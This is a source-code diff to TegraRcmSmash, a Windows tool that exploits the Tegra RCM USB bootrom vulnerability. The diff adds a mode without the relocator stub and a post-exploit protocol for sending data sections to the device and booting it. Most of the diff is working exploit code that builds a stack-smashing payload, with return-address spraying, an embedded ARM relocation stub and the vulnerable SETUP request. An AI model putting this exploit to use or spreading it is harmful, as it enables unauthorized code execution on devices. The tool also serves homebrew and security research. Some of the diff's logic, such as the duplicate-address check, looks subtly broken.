@@ -49,13 +49,13 @@ public:
 		else
 			return int(lengthTransferred);
 	}
-	int write(const u8* data, size_t dataLen)
+	int write(const u8* data, size_t dataLen, size_t packetSize = PACKET_SIZE)
 	{
 		int bytesRemaining = (int)dataLen;
 		size_t bytesWritten = 0;
 		while (bytesRemaining > 0)
 		{
-			const size_t bytesToWrite = (bytesRemaining < PACKET_SIZE) ? bytesRemaining : PACKET_SIZE;
+			const size_t bytesToWrite = (bytesRemaining < (int)packetSize) ? bytesRemaining : (int)packetSize;
 			const auto retVal = writeSingleBuffer(&data[bytesWritten], bytesToWrite);
 			if (retVal < 0)
 				return retVal;
@@ -108,7 +108,7 @@ public:
 
 		libusbk::libusb_request rawRequest;
 		memset(&rawRequest, 0, sizeof(rawRequest));
-		rawRequest.timeout = 2000; //ms
+		rawRequest.timeout = 1000; //ms
 		rawRequest.status.index = 0;
 		rawRequest.status.recipient = 0x02; //RECIPIENT_ENDPOINT
 
@@ -216,7 +216,7 @@ static BOOL WINAPI ConsoleSignalHandler(DWORD signal)
 	return TRUE;
 }
 
-int _tmain(int argc, const TCHAR* argv[])
+int _tmain(int argc, TCHAR* argv[])
 {
 #ifdef UNICODE
 	fflush(stdout);
@@ -224,22 +224,38 @@ int _tmain(int argc, const TCHAR* argv[])
 	fflush(stderr);
 	_setmode(_fileno(stderr), _O_WTEXT); 
 #endif
-
 	const TCHAR DEFAULT_MEZZO_FILENAME[] = TEXT("intermezzo.bin");
 	const TCHAR* mezzoFilename = DEFAULT_MEZZO_FILENAME;
 	const TCHAR* inputFilename = nullptr;
-
 	bool waitForDevice = false;
+	struct AdditionalDataItem
+	{
+		const TCHAR* filename = nullptr;
+		u32 address = 0;
+		u16 strTerm = 0;
+		bool reloaded = false;
+		ByteVector dataBytes;
+
+		bool isBOOT() const { return memcmp(&address, "BOOT", strlen("BOOT")+1) == 0; }
+		void setBOOT() { memcpy(&address, "BOOT", strlen("BOOT")); strTerm = 0; }
+
+		bool isAddr() const { return strTerm != 0; }
+		void setAddr(u32 newAddr) { address = newAddr; strTerm = 1; }
+		void setSect(const char* sectName) { memset(&address, 0, sizeof(address)); memcpy(&address, sectName, strlen(sectName)); strTerm = 0; }
+		const char* getSect() const { return (const char*)&address; }
+	};
+	vector<AdditionalDataItem> moreData;
 
 	auto PrintUsage = []() -> int
 	{
-		_tprintf(TEXT("Usage: TegraRcmSmash.exe [-V 0x0955] [-P 0x7321] [--relocator=intermezzo.bin] [-w] inputFilename.bin\n"));
+		_tprintf(TEXT("Usage: TegraRcmSmash.exe [-V 0x0955] [-P 0x7321] [--relocator=intermezzo.bin] [-w] inputFilename.bin ([PARAM:VALUE]|[0xADDR:filename])*\n"));
 		return -1;
 	};
 
+	const TCHAR HEXA_PREFIX[] = TEXT("0x");
 	for (int i=1; i<argc; i++)
 	{
-		const TCHAR* currArg = argv[i];
+		TCHAR* currArg = argv[i];
 
 		const TCHAR RELOCATOR_ARGUMENT[] = TEXT("--relocator");
 		const TCHAR VENDOR_ARGUMENT[] = TEXT("-V");
@@ -263,10 +279,24 @@ int _tmain(int argc, const TCHAR* argv[])
 		else if (_tcsnicmp(currArg, VENDOR_ARGUMENT, array_countof(VENDOR_ARGUMENT)-1) == 0 ||
 				_tcsnicmp(currArg, PRODUCT_ARGUMENT, array_countof(PRODUCT_ARGUMENT)-1) == 0)
 		{
+			const TCHAR* matchedStr = nullptr;
+			size_t matchedLen = 0;
+
+			if (_tcsnicmp(currArg, VENDOR_ARGUMENT, array_countof(VENDOR_ARGUMENT)-1) == 0)
+			{
+				matchedStr = VENDOR_ARGUMENT;
+				matchedLen = array_countof(VENDOR_ARGUMENT)-1;
+			}
+			else if (_tcsnicmp(currArg, PRODUCT_ARGUMENT, array_countof(PRODUCT_ARGUMENT)-1) == 0)
+			{
+				matchedStr = PRODUCT_ARGUMENT;
+				matchedLen = array_countof(PRODUCT_ARGUMENT)-1;
+			}
+
 			const TCHAR* numberValueStr = nullptr;
-			if (currArg[array_countof(VENDOR_ARGUMENT)-1] == '=')
-				numberValueStr = &currArg[array_countof(VENDOR_ARGUMENT)];
-			else if (currArg[array_countof(VENDOR_ARGUMENT)-1] == 0)
+			if (currArg[matchedLen] == '=')
+				numberValueStr = &currArg[matchedLen+1];
+			else if (currArg[matchedLen] == 0)
 			{
 				if (i==argc-1)
 					return PrintUsage();
@@ -276,14 +306,13 @@ int _tmain(int argc, const TCHAR* argv[])
 			else
 				return PrintUsage();
 
-			const TCHAR HEXA_PREFIX[] = TEXT("0x");
 			if (_tcslen(numberValueStr) >= array_countof(HEXA_PREFIX) &&
 				_tcsnicmp(numberValueStr, HEXA_PREFIX, array_countof(HEXA_PREFIX)-1) == 0)
 				numberValueStr += array_countof(HEXA_PREFIX)-1;
 
-			if (_tcsnicmp(currArg, VENDOR_ARGUMENT, array_countof(VENDOR_ARGUMENT)-1) == 0)
+			if (matchedStr == VENDOR_ARGUMENT)
 				deviceVid = _tcstoul(numberValueStr, nullptr, 0x10);
-			else if (_tcsnicmp(currArg, PRODUCT_ARGUMENT, array_countof(PRODUCT_ARGUMENT)-1) == 0)
+			else if (matchedStr == PRODUCT_ARGUMENT)
 				devicePid = _tcstoul(numberValueStr, nullptr, 0x10);
 			else
 				return PrintUsage();
@@ -297,9 +326,77 @@ int _tmain(int argc, const TCHAR* argv[])
 			_ftprintf(stderr, TEXT("Unknown option %Ts\n"), currArg);
 			return PrintUsage();
 		}
-		else //payload filename
+		else //payload/data filename
 		{
-			inputFilename = currArg;
+			if (inputFilename == nullptr)
+				inputFilename = currArg;
+			else
+			{
+				auto colonPos = _tcschr(currArg, ':');
+				if (colonPos == nullptr)
+				{
+					_ftprintf(stderr, TEXT("No colon separator in additional data argument '%Ts'\n"), currArg);
+					return PrintUsage();
+				}
+
+				*colonPos = 0;
+				const size_t leftPartLen = colonPos-currArg;
+				const TCHAR* leftPart = currArg;
+				const TCHAR* rightPart = colonPos+1;
+
+				AdditionalDataItem newItem;
+				newItem.filename = rightPart;
+				if (leftPartLen >= array_countof(HEXA_PREFIX) &&
+					_tcsnicmp(leftPart, HEXA_PREFIX, array_countof(HEXA_PREFIX)-1) == 0)
+				{
+					leftPart += array_countof(HEXA_PREFIX)-1;
+
+					wchar_t* endPos = nullptr;
+					newItem.setAddr(_tcstoul(leftPart, &endPos, 0x10));
+					if (endPos == nullptr || endPos == leftPart)
+					{
+						_ftprintf(stderr, TEXT("Invalid load address '%Ts' in additional data argument '%Ts'\n"), leftPart, currArg);
+						return PrintUsage();
+					}
+
+					auto it = std::find_if(moreData.cbegin(), moreData.cend(), [&newItem](const AdditionalDataItem& itm) {
+						return (itm.isAddr() == newItem.isAddr()) && (itm.address == newItem.address);
+					});
+
+					if (it != moreData.cbegin())
+					{
+						_ftprintf(stderr, TEXT("Load address 0x%08x already defined with filename '%Ts'\n"), it->address, it->filename);
+						return PrintUsage();
+					}
+
+					moreData.emplace_back(std::move(newItem));
+				}
+				else if (leftPartLen <= sizeof(newItem.address))
+				{
+					std::string convAscii; convAscii.reserve(_tcslen(leftPart));
+					for (size_t strPos=0; strPos<leftPartLen; strPos++) 
+						convAscii.push_back((char)leftPart[strPos]);
+
+					newItem.setSect(convAscii.c_str());
+
+					auto it = std::find_if(moreData.cbegin(), moreData.cend(), [&newItem](const AdditionalDataItem& itm) {
+						return (itm.isAddr() == newItem.isAddr()) && (itm.address == newItem.address);
+					});
+
+					if (it != moreData.cbegin())
+					{
+						_ftprintf(stderr, TEXT("Load parameter %hs already defined with value '%Ts'\n"), it->getSect(), it->filename);
+						return PrintUsage();
+					}
+
+					moreData.emplace_back(std::move(newItem));
+				}
+				else
+				{
+					_ftprintf(stderr, TEXT("Invalid param name '%Ts' in additional data argument '%Ts'\n"), leftPart, currArg);
+					return PrintUsage();
+				}
+			}
 		}
 	}
 
@@ -322,7 +419,7 @@ int _tmain(int argc, const TCHAR* argv[])
 				const u32 outRev	= HIWORD(fileInfo->dwFileVersionLS);
 				const u32 outBld	= LOWORD(fileInfo->dwFileVersionLS);
 
-				_stprintf_s(stringBuf, TEXT("%u.%u.%u.%u"), outMajor, outMinor, outRev, outBld);
+				_stprintf_s(stringBuf, TEXT("%u.%u.%u-%u"), outMajor, outMinor, outRev, outBld);
 				versionInfoStr = stringBuf;
 			}
 		}
@@ -347,16 +444,34 @@ int _tmain(int argc, const TCHAR* argv[])
 		_ftprintf(stderr, TEXT("Invalid USB PID specified\n"));
 		return PrintUsage();
 	}
-	if (mezzoFilename == nullptr || _tcslen(mezzoFilename) == 0)
-	{
-		_ftprintf(stderr, TEXT("Invalid relocator filename specified\n"));
-		return PrintUsage();
-	}
 	if (inputFilename == nullptr || _tcslen(inputFilename) == 0)
 	{
 		_ftprintf(stderr, TEXT("Please specify input filename\n"));
 		return PrintUsage();
 	}
+
+	std::sort(moreData.begin(), moreData.end(), [](const AdditionalDataItem& left, const AdditionalDataItem& right) {
+		if (left.isBOOT() != right.isBOOT()) //boot goes last
+		{
+			if (left.isBOOT())
+				return false;
+			if (right.isBOOT())
+				return true;
+		}
+
+		if (left.isAddr() != right.isAddr()) //named go first
+		{
+			if (left.isAddr())
+				return false;
+			if (right.isAddr())
+				return true;
+		}
+
+		if (left.isAddr())
+			return left.address < right.address;
+		else
+			return (strcmp(left.getSect(), right.getSect()) < 0);
+	});
 
 	auto ReadFileToBuf = [](ByteVector& outBuf, const TCHAR* fileType, const TCHAR* inputFilename, bool silent) -> int
 	{
@@ -387,37 +502,97 @@ int _tmain(int argc, const TCHAR* argv[])
 
 		return 0;
 	};
+
+	//populate address for BOOT if necessary, otherwise load file contents
+	for (size_t i=0; i<moreData.size(); i++)
+	{
+		auto& currData = moreData[i];
+		if (currData.isBOOT())
+		{
+			if (_tcslen(currData.filename) >= array_countof(HEXA_PREFIX) &&
+				_tcsnicmp(currData.filename, HEXA_PREFIX, array_countof(HEXA_PREFIX)-1) == 0)
+			{
+				auto addressStr = currData.filename + array_countof(HEXA_PREFIX)-1;
+
+				wchar_t* endPos = nullptr;
+				currData.setAddr(_tcstoul(addressStr, &endPos, 0x10));
+				if (endPos == nullptr || endPos == addressStr)
+				{
+					_ftprintf(stderr, TEXT("Invalid parameter address '%Ts' for setting '%hs'\n"), addressStr, currData.getSect());
+					return -1;
+				}
+			}
+			else
+			{
+				bool foundAddress = false;
+				for (size_t j=0; j<moreData.size(); j++)
+				{
+					if (j == i)
+						continue;
+
+					const auto& otherData = moreData[j];
+					if (otherData.isAddr() && _tcsicmp(currData.filename, otherData.filename) == 0)
+					{
+						currData.setAddr(otherData.address);
+						foundAddress = true;
+						break;
+					}
+				}
+
+				if (!foundAddress)
+				{
+					_ftprintf(stderr, TEXT("No load address defined for filename '%Ts' (required for setting '%hs')\n"), currData.filename, currData.getSect());
+					return -1;
+				}
+			}
+		}
+		else
+		{
+			auto readFileRes = ReadFileToBuf(currData.dataBytes, TEXT("data"), currData.filename, false);
+			if (readFileRes != 0)
+				return readFileRes;
+		}
+	}
 	
 	//intentional ptr comparison, if user supplied their own filename always read it
 	auto usingBuiltinMezzo = (mezzoFilename == DEFAULT_MEZZO_FILENAME);
+	bool usingNoMezzo = false;
+	if (mezzoFilename == nullptr || _tcslen(mezzoFilename) == 0)
+	{
+		usingBuiltinMezzo = true;
+		usingNoMezzo = true;
+	}
 
 	ByteVector mezzoBuf;
-	auto readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, usingBuiltinMezzo);
-	if (readFileRes != 0)
+	if (!usingNoMezzo)
 	{
-		if (usingBuiltinMezzo)
+		auto readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, usingBuiltinMezzo);
+		if (readFileRes != 0)
 		{
-			const byte BUILTIN_INTERMEZZO[] =
+			if (usingBuiltinMezzo)
 			{
-				0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
-				0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
-				0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
-				0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
-				0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
-				0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
-			};
+				const byte BUILTIN_INTERMEZZO[] =
+				{
+					0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
+					0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
+					0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
+					0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
+					0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
+					0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
+				};
 
-			mezzoBuf.resize(sizeof(BUILTIN_INTERMEZZO));
-			memcpy(&mezzoBuf[0], BUILTIN_INTERMEZZO, mezzoBuf.size());
+				mezzoBuf.resize(sizeof(BUILTIN_INTERMEZZO));
+				memcpy(&mezzoBuf[0], BUILTIN_INTERMEZZO, mezzoBuf.size());
+			}
+			else
+				return readFileRes;
 		}
 		else
-			return readFileRes;
+			usingBuiltinMezzo = false;
 	}
-	else
-		usingBuiltinMezzo = false;
 
 	ByteVector userFileBuf;
-	readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, false);
+	auto readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, false);
 	if (readFileRes != 0)
 		return readFileRes;
 
@@ -491,6 +666,7 @@ int _tmain(int argc, const TCHAR* argv[])
 		{
 			finishedUpEvent = WinHandle();
 			deviceInfo = &pluggedInDevice;
+			SetConsoleCtrlHandler(ConsoleSignalHandler, FALSE);
 		}
 		else
 		{
@@ -582,56 +758,79 @@ int _tmain(int argc, const TCHAR* argv[])
 		currPayloadOffs = payloadBuf.size();
 
 		constexpr u32 RCM_PAYLOAD_ADDR = 0x40010000;
-		constexpr u32 INTERMEZZO_LOCATION = 0x4001F000;
-		// Populate from[RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
-		// We'll use this data to smash the stack when we execute the vulnerable memcpy.
+		if (usingNoMezzo)
 		{
-			constexpr size_t bytesToAdd = (INTERMEZZO_LOCATION-RCM_PAYLOAD_ADDR);
-			payloadBuf.resize(payloadBuf.size()+bytesToAdd);
-			while (currPayloadOffs < payloadBuf.size())
-			{
-				const u32 spreadMeAround = INTERMEZZO_LOCATION;
-				memcpy(&payloadBuf[currPayloadOffs], &spreadMeAround, sizeof(spreadMeAround));
-				currPayloadOffs += sizeof(spreadMeAround);
-			}
-		}
+			constexpr size_t bytesToAdd = 0x1a3a * sizeof(u32);
+			payloadBuf.resize(payloadBuf.size()+bytesToAdd, 0);
+			currPayloadOffs += bytesToAdd;
+			assert(currPayloadOffs == payloadBuf.size());
 
-		// Reload the user-supplied relocator in case it changed
-		if (!usingBuiltinMezzo)
+			// Reload the user-supplied binary in case it changed
+			readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, false);
+			if (readFileRes != 0)
+				return readFileRes;
+
+			u32 entry = RCM_PAYLOAD_ADDR + (u32)userFileBuf.size() + sizeof(u32);
+			entry |= 1; //we want to jump to thumb code
+
+			payloadBuf.resize(payloadBuf.size()+sizeof(u32));
+			memcpy(&payloadBuf[currPayloadOffs], &entry, sizeof(entry));
+			currPayloadOffs += sizeof(entry);
+			assert(currPayloadOffs == payloadBuf.size());
+		}
+		else
 		{
-			readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, false);
+			constexpr u32 INTERMEZZO_LOCATION = 0x4001F000;
+			// Populate from[RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
+			// We'll use this data to smash the stack when we execute the vulnerable memcpy.
+			{
+				constexpr size_t bytesToAdd = (INTERMEZZO_LOCATION-RCM_PAYLOAD_ADDR);
+				payloadBuf.resize(payloadBuf.size()+bytesToAdd);
+				while (currPayloadOffs < payloadBuf.size())
+				{
+					const u32 spreadMeAround = INTERMEZZO_LOCATION;
+					memcpy(&payloadBuf[currPayloadOffs], &spreadMeAround, sizeof(spreadMeAround));
+					currPayloadOffs += sizeof(spreadMeAround);
+				}
+			}
+
+			// Reload the user-supplied relocator in case it changed
+			if (!usingBuiltinMezzo)
+			{
+				readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, false);
+				if (readFileRes != 0)
+					return readFileRes;
+			}
+
+			// Include the Intermezzo binary in the command stream. This is our first-stage payload, and it's responsible for relocating the final payload to 0x40010000.
+			{
+				payloadBuf.resize(payloadBuf.size()+mezzoBuf.size());
+				if (currPayloadOffs < payloadBuf.size())
+				{
+					memcpy(&payloadBuf[currPayloadOffs], &mezzoBuf[0], mezzoBuf.size());
+					currPayloadOffs += mezzoBuf.size();
+				}
+				assert(currPayloadOffs == payloadBuf.size());
+			}
+
+			constexpr u32 PAYLOAD_LOAD_BLOCK = 0x40020000;
+			// Finally, pad until we've reached the position we need to put the payload.
+			// This ensures the payload winds up at the location Intermezzo expects.
+			{
+				const auto position = INTERMEZZO_LOCATION + mezzoBuf.size();
+				const auto paddingSize = PAYLOAD_LOAD_BLOCK - position;
+
+				payloadBuf.resize(payloadBuf.size()+paddingSize, 0);
+				currPayloadOffs += paddingSize;
+				assert(currPayloadOffs == payloadBuf.size());
+			}
+
+			// Reload the user-supplied binary in case it changed
+			readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, false);
 			if (readFileRes != 0)
 				return readFileRes;
 		}
-
-		// Include the Intermezzo binary in the command stream. This is our first-stage payload, and it's responsible for relocating the final payload to 0x40010000.
-		{
-			payloadBuf.resize(payloadBuf.size()+mezzoBuf.size());
-			if (currPayloadOffs < payloadBuf.size())
-			{
-				memcpy(&payloadBuf[currPayloadOffs], &mezzoBuf[0], mezzoBuf.size());
-				currPayloadOffs += mezzoBuf.size();
-			}
-			assert(currPayloadOffs == payloadBuf.size());
-		}
-
-		constexpr u32 PAYLOAD_LOAD_BLOCK = 0x40020000;
-		// Finally, pad until we've reached the position we need to put the payload.
-		// This ensures the payload winds up at the location Intermezzo expects.
-		{
-			const auto position = INTERMEZZO_LOCATION + mezzoBuf.size();
-			const auto paddingSize = PAYLOAD_LOAD_BLOCK - position;
-
-			payloadBuf.resize(payloadBuf.size()+paddingSize, 0);
-			currPayloadOffs += paddingSize;
-			assert(currPayloadOffs == payloadBuf.size());
-		}
-
-		// Reload the user-supplied binary in case it changed
-		readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, false);
-		if (readFileRes != 0)
-			return readFileRes;
-
+		
 		// Put our user-supplied binary into the payload
 		{
 			payloadBuf.resize(payloadBuf.size()+userFileBuf.size());
@@ -643,9 +842,13 @@ int _tmain(int argc, const TCHAR* argv[])
 			assert(currPayloadOffs == payloadBuf.size());
 		}
 
+		constexpr size_t PAYLOAD_TOTAL_MAX_SIZE = 192*1024;
 		// Pad the payload to fill a USB request exactly, so we don't send a short
 		// packet and break out of the RCM loop.
-		payloadBuf.resize(align_up(payloadBuf.size(), RCMDeviceHacker::PACKET_SIZE), 0);
+		if (payloadBuf.size() < PAYLOAD_TOTAL_MAX_SIZE)
+			payloadBuf.resize(align_up(payloadBuf.size(), RCMDeviceHacker::PACKET_SIZE), 0);
+		else
+			payloadBuf.resize(PAYLOAD_TOTAL_MAX_SIZE);
 
 		// Send the constructed payload, which contains the command, the stack smashing values, the Intermezzo relocation stub, and the user payload.
 		_tprintf(TEXT("Uploading payload (mezzo size: %u, user size: %u, total size: %u, total padded size: %u)...\n"), 
@@ -687,8 +890,163 @@ int _tmain(int argc, const TCHAR* argv[])
 			_ftprintf(stderr, TEXT("Got win32 error %d tryin to smash\n"), -smashRes);
 			return -10;
 		}
-		else
-			_tprintf(TEXT("Smashed the stack with a 0x%04x byte SETUP request!\n"), smashRes);
+
+		_tprintf(TEXT("Smashed the stack with a 0x%04x byte SETUP request!\n"), smashRes);
+
+		if (moreData.size() > 0)
+		{
+			ByteVector readBuffer(32768, 0);
+			int bytesRead = 0;
+			while ((bytesRead = rcmDev.read(&readBuffer[0], readBuffer.size())) > 0)
+			{
+				auto dataIt = std::find_if(moreData.begin(), moreData.end(), [bytesRead,&readBuffer](const AdditionalDataItem& itm) 
+				{
+					if (itm.isAddr() || itm.isBOOT())
+						return false;
+
+					const char* dataName = itm.getSect();
+					const size_t dataNameLen = strlen(dataName);
+					if (bytesRead > int(dataNameLen) && readBuffer[dataNameLen] == '\n' &&
+						strncmp((const char*)&readBuffer[0], dataName, dataNameLen) == 0)
+						return true;
+
+					return false;
+				});
+
+				static const char READY_INDICATOR[] = "READY.\n";
+				if (bytesRead == array_countof(READY_INDICATOR)-1 && memcmp(&readBuffer[0], READY_INDICATOR, array_countof(READY_INDICATOR)-1) == 0)
+				{
+					_tprintf(TEXT("Switching to command mode due to %hs"), READY_INDICATOR);
+					for (auto& currData : moreData)
+					{
+						if (!currData.isAddr() && !currData.isBOOT())
+							continue;
+
+						if (!currData.isBOOT())
+						{
+							if (!currData.reloaded)
+							{
+								readFileRes = ReadFileToBuf(currData.dataBytes, TEXT("data"), currData.filename, false);
+								if (readFileRes != 0)
+									return readFileRes;
+
+								currData.reloaded = true;
+							}
+
+							_tprintf(TEXT("Sending %Ts (%llu bytes) to address 0x%08x\n"), currData.filename, (u64)currData.dataBytes.size(), currData.address);
+							if (currData.dataBytes.size() == 0)
+								continue;
+
+							int bytesSent = rcmDev.write((const u8*)"RECV", strlen("RECV"));
+							if (bytesSent == strlen("RECV"))
+							{
+								u32 offsetData[] ={ _byteswap_ulong((u32)currData.address), _byteswap_ulong((u32)currData.dataBytes.size()) };
+								bytesSent = rcmDev.write((const u8*)&offsetData[0], sizeof(offsetData));
+								if (bytesSent == sizeof(offsetData))
+									bytesSent = rcmDev.write(&currData.dataBytes[0], currData.dataBytes.size(), readBuffer.size());
+							}
+							if (bytesSent != int(currData.dataBytes.size()))
+							{
+								if (bytesSent < 0)
+								{
+									_ftprintf(stderr, TEXT("Got win32 err %d during send operation!\n"), -bytesSent);
+									return -10;
+								}
+								else if (size_t(bytesSent) < currData.dataBytes.size())
+								{
+									_ftprintf(stderr, TEXT("Only sent %d out of %llu bytes for data file %Ts!\n"), bytesSent, (u64)currData.dataBytes.size(), currData.filename);
+									continue;
+								}
+							}
+						}
+						else
+						{
+							_tprintf(TEXT("Booting AArch64 with PC 0x%08x...\n"), currData.address);
+							int bytesSent = rcmDev.write((const u8*)"BOOT", strlen("BOOT"));
+							if (bytesSent == strlen("BOOT"))
+							{
+								u32 addrData = _byteswap_ulong(currData.address);
+								bytesSent = rcmDev.write((const u8*)&addrData, sizeof(addrData));
+								if (bytesSent == sizeof(addrData))
+								{
+									_tprintf(TEXT("BOOT command sent successfully! Exiting.\n"));
+									return 0;
+								}
+							}
+						}
+					}
+				}
+				else if (dataIt == moreData.end()) //no matching section to send, just print out the message
+				{
+					WinString printMe((const char*)&readBuffer[0], (const char*)&readBuffer[bytesRead]);
+					_tprintf(printMe.c_str());
+				}
+				else //got a section to send
+				{
+					_tprintf(TEXT("Switching to sending of section '%hs'\n"), dataIt->getSect());
+					if (!dataIt->reloaded)
+					{
+						readFileRes = ReadFileToBuf(dataIt->dataBytes, TEXT("data"), dataIt->filename, false);
+						if (readFileRes != 0)
+							return readFileRes;
+
+						dataIt->reloaded = true;
+					}
+
+					size_t numBytesSent = 0;
+					while ((bytesRead = rcmDev.read(&readBuffer[0], readBuffer.size())) >= 8)
+					{
+						u32 offset, length;
+						memcpy(&offset, &readBuffer[0], sizeof(offset));
+						memcpy(&length, &readBuffer[sizeof(offset)], sizeof(length));
+						offset = _byteswap_ulong(offset);
+						length = _byteswap_ulong(length);
+
+						if (length == 0)
+						{
+							_tprintf(TEXT("Finished sending section '%hs' (total bytes sent: %llu)\n"), dataIt->getSect(), (u64)numBytesSent);
+							break;
+						}
+
+						const auto neededBytes = size_t(offset)+size_t(length);
+						if (neededBytes > dataIt->dataBytes.size())
+						{
+							_ftprintf(stderr, TEXT("Device requested %llu bytes (we only have %llu in file '%Ts')!\n"), (u64)neededBytes, (u64)dataIt->dataBytes.size(), dataIt->filename);
+							return -2;
+						}
+
+						_tprintf(TEXT("Sending 0x%08x bytes from offset 0x%08x\n"), length, offset);
+						int bytesSent = rcmDev.write(&dataIt->dataBytes[offset], length, readBuffer.size());
+						if (bytesSent != int(length))
+						{
+							if (bytesSent >= 0)
+								_ftprintf(stderr, TEXT("Warn: Sent only %d out of requested %u bytes\n"), bytesSent, length);
+							else
+							{
+								_ftprintf(stderr, TEXT("Got win32 err %d during send operation!\n"), -bytesSent);
+								return -10;
+							}
+						}
+						numBytesSent += bytesSent;
+					}
+					if (bytesRead < 0)
+					{
+						_ftprintf(stderr, TEXT("Got win32 err %d during [offset,length] read operation!\n"), -bytesRead);
+						return -10;
+					}
+					else if (bytesRead < 8)
+					{
+						_ftprintf(stderr, TEXT("Read too short packet (%d bytes) while in section send mode, dropping out.\n"), bytesRead);
+						break;
+					}
+				}
+			}
+			if (bytesRead < 0)
+			{
+				_ftprintf(stderr, TEXT("Win32 error %d during post-smash read op\n"), -bytesRead);
+				return -10;
+			}
+		}
 	}
 
 	return 0;
